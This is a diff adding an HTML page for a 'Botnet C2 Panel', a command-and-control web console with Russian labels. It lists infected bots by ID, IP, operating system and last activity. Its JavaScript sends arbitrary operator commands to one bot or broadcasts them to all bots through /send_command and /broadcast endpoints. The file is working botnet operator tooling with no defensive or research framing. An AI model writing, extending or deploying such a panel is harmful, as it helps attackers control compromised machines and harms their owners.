@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Web Panel</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+        th { background: #f0f0f0; }
+        input, button { padding: 8px; margin: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Botnet C2 Panel</h1>
+    <button onclick="listBots()">Обновить</button>
+
+    <table id="botTable">
+        <tr><th>ID</th><th>IP</th><th>OS</th><th>Последняя активность</th><th>Действия</th></tr>
+    </table>
+
+    <script>
+        function listBots() {
+            fetch('/').then(r => r.text()).then(html => {
+                const temp = document.createElement('div');
+                temp.innerHTML = html;
+                document.body.innerHTML = temp.querySelector('body').innerHTML;
+            });
+        }
+
+        function sendCmd(id) {
+            const cmd = prompt(`Команда для бота ${id}:`);
+            if (cmd) {
+                fetch('/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: id, command: cmd })
+                });
+            }
+        }
+
+        function broadcast() {
+            const cmd = prompt("Команда для всех:");
+            if (cmd) {
+                fetch('/broadcast', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: cmd })
+                });
+            }
+        }
+    </script>
+</body>
+</html>
